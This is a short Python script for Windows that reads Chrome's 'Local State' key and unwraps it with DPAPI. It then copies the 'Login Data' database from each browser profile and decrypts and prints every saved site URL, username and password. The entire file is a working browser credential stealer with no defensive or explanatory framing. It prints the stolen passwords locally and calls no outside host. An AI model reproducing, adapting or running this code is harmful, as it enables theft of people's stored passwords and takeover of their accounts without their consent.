import os
import re
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil


#GLOBAL CONST
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))

def get_secret_key():
    try:
        #1- Get secretkey from chrome local state
        with open( CHROME_PATH+"\Local State", "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        #2- Remove suffix DPAPI
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        return None
    

def decrypt_pass(ciphertext,secret_key):
    # Extracting encrypted password from ciphertext
    initialisation_value = ciphertext[3:15]
    print("initialisation_value: ",initialisation_value)
    # Build the AES algorithm to decrypt the password
    encrypted_password = ciphertext[15:-16]
    print("encrypted_password: ", encrypted_password)
    cipher = AES.new(secret_key, AES.MODE_GCM, initialisation_value)
    decrypted_pass = cipher.decrypt(encrypted_password)
    #Final Step: Decrypted Password
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass


def get_data_in_db():
    #Search user profile or default folder (this is where the encrypted login password is stored)
    folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
    for folder in folders:
        #Get login data file
        chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
        #Connect to sqlite database
        shutil.copy2(chrome_path_login_db, "Logindata.db")
        conn = sqlite3.connect("Logindata.db")
        cursor = conn.cursor()
        #Get data from logins table 
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for index,login in enumerate(cursor.fetchall()):
            url = login[0]
            username = login[1]
            ciphertext= login[2]
            secret = get_secret_key()
            passwd = decrypt_pass(ciphertext,secret)
            print(ciphertext)
            print("Ressource: %d"%(index))
            print("Url:",url)
            print("Username: ",username)
            print("Password: ",passwd)
            print("~"*30)

  
get_secret_key()
get_data_in_db()